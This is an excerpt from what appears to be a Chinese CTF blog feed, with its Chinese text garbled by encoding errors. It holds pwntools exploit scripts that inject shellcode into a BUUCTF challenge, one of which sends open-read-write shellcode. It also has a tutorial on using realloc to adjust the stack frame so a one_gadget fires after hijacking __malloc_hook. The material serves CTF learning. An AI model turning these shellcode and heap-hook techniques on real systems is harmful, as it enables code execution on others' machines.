class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x29\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xBF\x00\x00\x00\x8F\x42\x2A\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x2F\x8F\x42\x2B\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x62\x8F\x42\x2C\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x69\x8F\x42\x2D\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x6E\x8F\x42\x2E\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x2F\x8F\x42\x2F\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x73\x8F\x42\x30\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x68\x8F\x42\x31\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x00\x8F\x42\x32\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x57\x8F\x42\x33\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x54\x8F\x42\x34\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x5F\x8F\x42\x35\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x36\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x37\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xF6\x00\x00\x00\x8F\x42\x38\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x48\x8F\x42\x39\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x31\x8F\x42\x3A\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x68\xD2\x00\x00\x00\x8F\x42\x3B\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x0F\x8F\x42\x3C\xC3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x6A\x05\x8F\x42\x3D\xC3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400AB6)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x48\x83\xC2\x20\xFF\xE2&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/07/22/ygNzXT6w8vYr3JL.png" alt="image-20220722120733156" style="zoom: 50%;" /><h2 id="æ›´ç®€å•çš„æ€è·¯"><a href="#æ›´ç®€å•çš„æ€è·¯" class="headerlink" title="æ›´ç®€å•çš„æ€è·¯"></a>æ›´ç®€å•çš„æ€è·¯</h2><p>åšå‡ºæ¥ä¹‹åï¼Œæˆ‘å»çœ‹äº†å…¶ä»–å¸ˆå‚…çš„wpï¼Œå‘ç°roderickå¸ˆå‚…çš„æ€è·¯éå¸¸ç®€å•å’Œå·§å¦™ã€‚<a href="https://www.cnblogs.com/LynneHuan/p/15229732.html">roderickå¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« </a></p><p>ç”¨åˆ°äº†xchgè¿™ä¸ªæŒ‡ä»¤ï¼ˆè¿™ä¸ªæŒ‡ä»¤çš„ä½œç”¨å°±æ˜¯äº¤æ¢ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ï¼‰</p><p>å› ä¸ºåœ¨æ‰§è¡Œcall rdxçš„æ—¶å€™ï¼Œrdxå°±æ˜¯å¯æ‰§è¡Œå†…å­˜çš„åœ°å€ï¼Œè®©å®ƒè·Ÿrsiå¯„å­˜å™¨äº’æ¢ä¸€ä¸‹ã€‚ç”±äºraxå¯„å­˜å™¨æ­£å¥½æ˜¯0ï¼Œæ‰€ä»¥æ‰§è¡Œsyscallå°±ç›¸å½“äºreadå‡½æ•°å¾€å¯æ‰§è¡ŒåŒºåŸŸå»å†™æ•°æ®ã€‚æ•ˆæœå¦‚ä¸‹å›¾</p><p><img src="https://s2.loli.net/2022/07/22/284NKCPMorVikBR.png" alt="image-20220722121138002"></p><p>è¿™æ ·å°±å¯ä»¥ç›´æ¥å¾€å¯æ‰§è¡Œçš„è¿™ç‰‡å†…å­˜å†™å…¥æ•°æ®äº†ã€‚(æˆ‘åˆè®©rsiåŠ äº†9ï¼Œè¿™æ ·å°±ç›´æ¥å†™åˆ°äº†ç´§æ¥ç€syscallæŒ‡ä»¤çš„åœ°æ–¹)è¿™æ ·syscallæ‰§è¡Œå®Œï¼Œç›´æ¥å°±æ‰§è¡Œæˆ‘å†™å…¥çš„æ•°æ®äº† æ•ˆæœå¦‚ä¸‹å›¾</p><img src="https://s2.loli.net/2022/07/22/AtRf8Xl1MgN9E3e.png" alt="image-20220722121403173" style="zoom:50%;" /><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29220</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#debug(p,0x400AB6)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will you continue?(enter &#x27;n&#x27; to quit) :&quot;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;start!!!!&#x27;</span>,<span class="string">b&#x27;\x48\x87\xF2\x48\x83\xC6\x09\x0F\x05&#x27;</span>)</span><br><span class="line">p.sendline(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/07/22/Y2tCNxBViLodyRb.png" alt="image-20220722121508169"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨reallocå‡½æ•°æ¥è°ƒæ•´æ ˆå¸§è®©one_gadgetç”Ÿæ•ˆ</title>
      <link href="/posts/f7fd9662.html"/>
      <url>/posts/f7fd9662.html</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨one_gadgetçš„æ—¶å€™ï¼Œå¿…é¡»è¦æ»¡è¶³ä¸€å®šæ¡ä»¶ï¼Œå¦‚æœæ‰€æœ‰one_gadgetéƒ½æ²¡æœ‰æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨reallocå‡½æ•°æ¥è°ƒæ•´æ ˆå¸§æ‰“one_gadgetã€‚<strong>æœ¬æ–‡ä»¥2.23çš„libcç‰ˆæœ¬ä¸­çš„reallocå‡½æ•°ä¸¾ä¾‹è¯´æ˜ä½¿ç”¨reallocå‡½æ•°æ˜¯å¦‚ä½•è°ƒæ•´æ ˆå¸§æ‰“one_gadgetçš„ï¼Œä½†æ˜¯åœ¨ä¸åŒçš„libcç‰ˆæœ¬ä¸­ï¼Œreallocå‡½æ•°çš„å…·ä½“æ±‡ç¼–ä»£ç ä¹Ÿä¸åŒï¼Œå°±å¯¼è‡´äº†ä»åœ¨ä¸åŒlibcç‰ˆæœ¬ä¸­çš„reallocå‡½æ•°çš„ç›¸åŒåç§»å¤„å¼€å§‹æ‰§è¡Œï¼Œæœ€ç»ˆè°ƒæ•´çš„æ ˆå¸§ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œå› æ­¤åœ¨å®é™…çš„åšé¢˜ä¸­ï¼Œå»ä¸€ä¸ªä¸€ä¸ªå°è¯•åç§»ä¼šæ¯”è®¡ç®—å‡ºèƒ½ä½¿one_gadgetç”Ÿæ•ˆçš„reallocå‡½æ•°åç§»æ›´å¿«ã€‚</strong></p><h2 id="æ€ä¹ˆçœ‹one-gadgetæ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Ÿ"><a href="#æ€ä¹ˆçœ‹one-gadgetæ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Ÿ" class="headerlink" title="æ€ä¹ˆçœ‹one_gadgetæ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Ÿ"></a>æ€ä¹ˆçœ‹one_gadgetæ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Ÿ</h2><p>ä¸‹å›¾æ˜¯one_gadgetçš„ä½¿ç”¨æ¡ä»¶</p><p><img src="/../img/2706180-20220628225909669-1798755531.png"></p><p>ç„¶åä¸‹å›¾æ­¤æ—¶çš„__malloc_hookå·²ç»è¢«ä¿®æ”¹ä¸ºone_gadgetäº†ï¼Œå¹¶ä¸”æ­¤æ—¶å‡†å¤‡æ‰§è¡Œcallocå‡½æ•°ï¼ˆè¿™é‡Œå…ˆç†è§£æˆmallocå°±è¡Œï¼Œåˆ©ç”¨æ‰‹æ³•æ˜¯ä¸€æ ·çš„ï¼‰ï¼Œç„¶åsiå•æ­¥è¿›å»ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220628225923066-1597735649.png"></p><p>ç„¶åå•æ­¥åˆ°è¿™é‡Œï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œæ­¤æ—¶å°±æ‰§è¡Œäº†__malloc_hookä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯å°†è¦æ‰§è¡Œæˆ‘ä»¬çš„one_gadget</p><p><img src="/../img/2706180-20220628225939650-1778459149.png"></p><p>ç„¶åæˆ‘ä»¬å†siè¿›å»ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220628225951021-1292507958.png"></p><p>ç„¶åæˆ‘ä»¬çœ‹æ­¤æ—¶çš„æ˜¯å¦æ»¡è¶³one_gadgetçš„æ‰§è¡Œæ¡ä»¶</p><p><img src="/../img/2706180-20220628230006304-1061222448.png"></p><p>å…ˆçœ‹raxå¯„å­˜å™¨çš„å€¼ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå‘ç°ä¸ä¸º0ï¼ˆNULL)ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªone_gadgetä¸èƒ½ç”¨</p><p><img src="/../img/2706180-20220628230018106-1085476136.png"></p><p>ç„¶åçœ‹[rsp+0x30]çš„å€¼(å¦‚ä¸‹å›¾)ï¼Œå‘ç°ä¹Ÿä¸ä¸º0(NULL)ï¼Œå› æ­¤ç¬¬äºŒä¸ªä¹Ÿä¸èƒ½ç”¨</p><p><img src="/../img/2706180-20220628230035203-2099513409.png"></p><p>ç„¶åä¾æ¬¡ç±»æ¨ï¼Œå‘ç°[rsp+0x50]å’Œ[rsp+0x70]çš„åœ°æ–¹ä¹Ÿéƒ½ä¸ä¸º0ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220628230048946-428826209.png"></p><p>è‡³æ­¤ï¼Œå››ä¸ªone_gadgetå…¨éƒ¨å¤±æ•ˆã€‚å› æ­¤æˆ‘ä»¬è¦ç”¨reallocå‡½æ•°æ¥è°ƒæ•´æ ˆå¸§ï¼Œä»è€Œä½¿one_gadgetèƒ½å¤Ÿä½¿ç”¨ã€‚</p><h2 id="ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§ï¼Ÿ</h2><p>æˆ‘è®¤ä¸ºåŸå› æœ‰ä¸¤ä¸ª<strong>ï¼ˆæ ¹æœ¬åŸå› æ˜¯ç¬¬ä¸€ä¸ªï¼‰</strong>ï¼š</p><blockquote><p> ç¬¬ä¸€ã€reallocå‡½æ•°å­˜åœ¨ä¸€ä¸ª__realloc_hookï¼ˆæ‰§è¡Œreallocçš„æ—¶å€™ä¼šåˆ¤æ–­__realloc_hookæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™æ‰§è¡Œ__realloc_hookæŒ‡å‘çš„å†…å®¹ï¼‰ï¼ŒåŒæ—¶__realloc_hookå’Œ__malloc_hookçš„åœ°å€æ˜¯æŒ¨ç€çš„ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬è¦†å†™__malloc_hookçš„æ—¶å€™å¯ä»¥é¡ºä¾¿æ§åˆ¶__realloc_hookã€‚<strong>å› æ­¤æˆ‘ä»¬æŠŠ__malloc_hookæ”¹æˆ__realloc_hookç„¶å__realloc_hookå†™å…¥one_gagetï¼Œæœ€åä¾ç„¶å¯ä»¥æ‰§è¡Œone_gadget</strong></p></blockquote><p><img src="/../img/2706180-20220628230103153-137562286.png"></p><blockquote><p>ç¬¬äºŒã€reallocå‡½æ•°ä¸­æœ‰å¤§é‡çš„pushæŒ‡ä»¤ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼ˆåœ¨æ‰§è¡Œ__realloc_hookä¹‹å‰ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å°†reallocå‡½æ•°çš„åœ°å€åŠ ä¸Šä¸€å®šçš„åç§»ï¼Œå°±å¯ä»¥é€‰æ‹©å»æ‰§è¡Œä¸€å®šé‡çš„pushæŒ‡ä»¤ï¼Œä»è€ŒæŠ¬é«˜æ ˆå¸§ï¼ˆæˆ‘æŒ‡çš„æŠ¬é«˜æ ˆå¸§æ˜¯æ ˆå¸§åˆå‘ç€ä½åœ°å€å¢é•¿äº†ï¼‰ã€‚è¿™æ ·rspå¢åŠ äº†ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ä¾‹å¦‚rsp+0x30ï¼Œè®©å…¶å†…å­˜å€¼æ­£å¥½è½åœ¨0å¤„ã€‚</p></blockquote><p><img src="/../img/2706180-20220628230122415-749325713.png"></p><h2 id="å…·ä½“æ€ä¹ˆç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§"><a href="#å…·ä½“æ€ä¹ˆç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§" class="headerlink" title="å…·ä½“æ€ä¹ˆç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§"></a>å…·ä½“æ€ä¹ˆç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§</h2><p>é¦–å…ˆçœ‹ä¸€ä¸‹ä¸Šé¢çš„å›¾ç‰‡ï¼Œå…¶ä¸­æœ‰6ä¸ªpushæŒ‡ä»¤å’Œä¸€ä¸ªsub rsp,0x38æŒ‡ä»¤ã€‚<strong>è¿™äº›æŒ‡ä»¤éƒ½æ˜¯æŠŠæ ˆå¸§æŠ¬é«˜ï¼ˆæˆ‘è¯´çš„æŠ¬é«˜æ˜¯æŒ‡æ ˆå‘ä½åœ°å€å¢é•¿ï¼‰ï¼Œç„¶åæŠ¬é«˜æ ˆå¸§ä¹‹åå»æ‰§è¡Œone_gadgetã€‚(ä»¥[rsp+0x30]è¿™ä¸ªæ¡ä»¶ä¸ºä¾‹)è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¿…é¡»å»[rsp+0x30]çš„ä¸Šé¢(ä¹Ÿå°±æ˜¯ä½åœ°å€å¤„)å¯»æ‰¾0</strong> (è¿™å¥è¯æ‚¨ç»†å“)</p><p>ç„¶åå°†reallocå‡½æ•°åœ°å€åŠ ä¸Šä¸åŒçš„åç§»ï¼Œå°±å¯ä»¥æ‰§è¡Œä¸€å®šæ•°é‡çš„pushå’Œsub rsp,0x38æŒ‡ä»¤(å› ä¸ºå¯ä»¥è·³è¿‡ä¸€å®šä¸ªæ•°çš„æŒ‡ä»¤)ã€‚å…ˆè€ƒè™‘ä¸€ä¸‹ç›´æ¥ä»0x846c0è¿™ä¸ªåœ°å€ï¼ˆå…ˆå¿½ç•¥PIEé€ æˆçš„å½±å“ï¼‰å¼€å§‹æ‰§è¡Œã€‚è¿™æ ·åˆ°æ‰§è¡Œone_gadgetä¹‹å‰æœ‰6ä¸ªpushå’Œä¸€ä¸ªsub rsp,0x38æŒ‡ä»¤ï¼Œè¿™å°†æ ˆå¸§æŠ¬é«˜äº†0x68(0x8<em>6+0x38),ä½†æ˜¯åˆ«å¿˜äº†ç”±äºå¤šcalläº†ä¸€æ¬¡(calläº†reallocå‡½æ•°ï¼Œç„¶ååˆå»call one_gadgetï¼Œä½†æ˜¯åŸæœ¬åªæœ‰ä¸€æ¬¡call one_gadget)ï¼Œ*<em>å› æ­¤å¤šæ‰§è¡Œäº†ä¸€æ¬¡å‹æ ˆæŒ‡ä»¤ï¼Œæ‰€ä»¥æœ€ç»ˆç›´æ¥æ‰§è¡Œreallocå‡½æ•°ï¼Œæ ˆå¸§æŠ¬é«˜äº†0x70å­—èŠ‚ï¼ˆå°±æ˜¯å°†åŸæœ¬çš„rspå˜æˆäº†rsp-0x70ï¼‰</em></em></p><p>å¦‚æœæ‰§è¡Œreallocå‡½æ•°æ ˆå¸§æœ€å°‘æŠ¬é«˜å¤šå°‘å‘¢ï¼Ÿ</p><blockquote><p>æœ€å°‘è‚¯å®šæ˜¯åªæŠ¬é«˜å…«å­—èŠ‚(ä¹Ÿå°±æ˜¯ä»…ä»…å¤šäº†ä¸€æ¬¡callæ—¶æ‰§è¡Œçš„å‹æ ˆæŒ‡ä»¤)ï¼Œ<strong>è¿™é‡Œæˆ‘ä»¬å…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µï¼Œå‡è®¾å¿…é¡»è¦æ‰§è¡Œä¸€æ¬¡å¯¹æ ˆæ“ä½œæŒ‡ä»¤ï¼Œé‚£ä¹ˆæ‰§è¡Œä¸€æ¬¡reallocå‡½æ•°æœ€å°‘åº”è¯¥æŠ¬é«˜0x40ä¸ªå­—èŠ‚ï¼ˆsub rsp,0x38è®©rsp-0x38å†åŠ ä¸Šcallæ—¶çš„å‹æ ˆæŒ‡ä»¤ï¼‰</strong></p></blockquote><h2 id="ç»“è®ºï¼š"><a href="#ç»“è®ºï¼š" class="headerlink" title="ç»“è®ºï¼š"></a>ç»“è®ºï¼š</h2><blockquote><p><strong>å½“ä½¿ç”¨reallocå‡½æ•°è°ƒæ•´æ ˆå¸§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†rspå¢åŠ ï¼ˆè¿™ä¸ªå¢åŠ æŒ‡çš„æ˜¯æ ˆå‘ä½åœ°å€å¢é•¿ï¼‰çš„èŒƒå›´æ§åˆ¶åœ¨ 0x40ä¸0x70ä¹‹é—´</strong>(å¦‚æœä¸è€ƒè™‘æœ€ä½0x8å­—èŠ‚çš„è¯)ï¼Œ<strong>ä¸ºäº†æ»¡è¶³one_gadgetçš„æ¡ä»¶ï¼Œåªè¦rsp-0x40ä¸rsp-0x70ä¹‹é—´å­˜åœ¨ä¸€ä¸ªä¸º0çš„å†…å­˜å•å…ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶reallocå‡½æ•°ä¸­pushçš„æ•°é‡æ¥æ»¡è¶³æ¡ä»¶ï¼ˆæ§åˆ¶çš„æ–¹æ³•å°±æ˜¯å°†reallocå‡½æ•°çš„åœ°å€åŠ ä¸Šåç§»æ¥è·³è¿‡ä¸€å®šé‡çš„pushæŒ‡ä»¤ï¼‰ã€‚</strong></p><p>ä»¥[rsp+0x30]&#x3D;NULlè¿™ä¸ªæ¡ä»¶ä¸ºä¾‹ï¼ŒåŠ ä¸Šrsp-0x40ä¸rsp-0x70è¿™ä¸ªèŒƒå›´ã€‚ä¹Ÿå°±æ˜¯è¯´æœ€åè¦åœ¨rsp-0x10ä¸rsp-0x40æ‰¾ä¸€å—å€¼ä¸º0æˆå†…å­˜å•å…ƒã€‚</p></blockquote><h2 id="ä¸¾ä¾‹æ¼”ç¤ºï¼š"><a href="#ä¸¾ä¾‹æ¼”ç¤ºï¼š" class="headerlink" title="ä¸¾ä¾‹æ¼”ç¤ºï¼š"></a>ä¸¾ä¾‹æ¼”ç¤ºï¼š</h2><p>ç°åœ¨æˆ‘å·²ç»å‘ç°å››ä¸ªone_gadgetå…¨éƒ¨å¤±æ•ˆï¼Œç„¶åæˆ‘æƒ³çœ‹çœ‹å…¶ä¸­ä¸€ä¸ªone_gadget [rsp+0x30]ç»è¿‡è°ƒæ•´æ ˆå¸§åèƒ½å¦ä½¿ç”¨ï¼Œå…ˆå»çœ‹rsp-0x10ä¸rsp-0x40 è¿™ä¸ªèŒƒå›´æ˜¯å¦å­˜åœ¨å€¼ä¸º0çš„å†…å­˜ã€‚</p><p><img src="/../img/2706180-20220628230144252-305430597.png"></p><p>è¿™ä¸ª0çš„åœ°å€æ˜¯0x7ffc5f3b9ca0ï¼Œå¦‚æœå°†reallocå‡½æ•°å¯¹æ ˆæ“ä½œæŒ‡ä»¤å…¨éƒ¨æ‰§è¡Œå®Œçš„è¯ï¼Œé‚£ä¹ˆrsp-0x30çš„ä½ç½®å°±æ˜¯0x7ffc5f3b9c98ï¼Œæˆ‘ä»¬å°‘æ‰§è¡Œä¸€ä¸ªpushçš„è¯ï¼Œé‚£ä¹ˆrsp-0x30å°±ä¼šå˜æˆ0x7ffc5f3b9ca0ã€‚å› æ­¤åˆ¤æ–­å‡ºæ¥æˆ‘ä»¬å†™å…¥reallocåœ°å€+2(pushæŒ‡ä»¤é•¿åº¦ä¸º2å­—èŠ‚)å°±å¯ä»¥è®©one_gadgetç”Ÿæ•ˆï¼ˆå› ä¸ºè·³è¿‡äº†ä¸€æ¬¡pushæŒ‡ä»¤ï¼‰</p><p>ä¸‹å›¾ä¸ºreallocè°ƒæ•´æ ˆå¸§å¤„çš„expã€‚</p><p><img src="/../img/2706180-20220628230300587-674729075.png"></p><p>å¯ä»¥çœ‹è§ä¸‹å›¾å·²ç»è¯´æ˜è¿™ä¸ªone_gadgetå·²ç»ç”Ÿæ•ˆï¼Œæˆ‘ä»¬è·å–äº†shell</p><p><img src="/../img/2706180-20220628230324633-1114978079.png"></p><h2 id="one-gadgetçš„æ¡ä»¶æ˜¯è·å–shellçš„å……åˆ†æ¡ä»¶"><a href="#one-gadgetçš„æ¡ä»¶æ˜¯è·å–shellçš„å……åˆ†æ¡ä»¶" class="headerlink" title="one_gadgetçš„æ¡ä»¶æ˜¯è·å–shellçš„å……åˆ†æ¡ä»¶"></a>one_gadgetçš„æ¡ä»¶æ˜¯è·å–shellçš„å……åˆ†æ¡ä»¶</h2><p>å¦‚æœè¿™é“é¢˜ä½ å·²ç»æŒæ¡äº†ä¸Šé¢ä»‹ç»reallocè°ƒæ•´æ ˆå¸§çš„è¯ï¼Œå…¶å®å°±å·²ç»æ˜¯ç»“æŸäº†ã€‚ä¸è¿‡åœ¨æœ€åæˆ‘åˆå­¦äº†ä¸€ä¸ªæ›´é‡è¦çš„ç»†èŠ‚ã€‚<strong>è¿˜æ˜¯ä¸Šé¢çš„è„šæœ¬æœ€åå¦‚æœå®é™…è°ƒä¸€ä¸‹çš„è¯ï¼Œå‘ç°__malloc_hooké‡Œå†™realloc+1æˆ–è€…realloc+3æˆ–è€…ç›´æ¥å†™reallocåœ°å€éƒ½å¯ä»¥è·å–shellã€‚</strong>ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220628230336256-1198676526.png"></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿè¿™æ˜¯å¦æ„å‘³ç€ä¸Šé¢æˆ‘ä»¬çš„ç»“è®ºæœ‰è¯¯ï¼Ÿ</p><p>æ¢ç©¶ä¸€ä¸‹ä¾¿çŸ¥ã€‚é¦–å…ˆè°ƒè¯•ä¸€ä¸‹__malloc_hooké‡Œå†™å…¥reallocå‡½æ•°çš„åœ°å€ è¿™ä¸ªæƒ…å†µã€‚</p><p><img 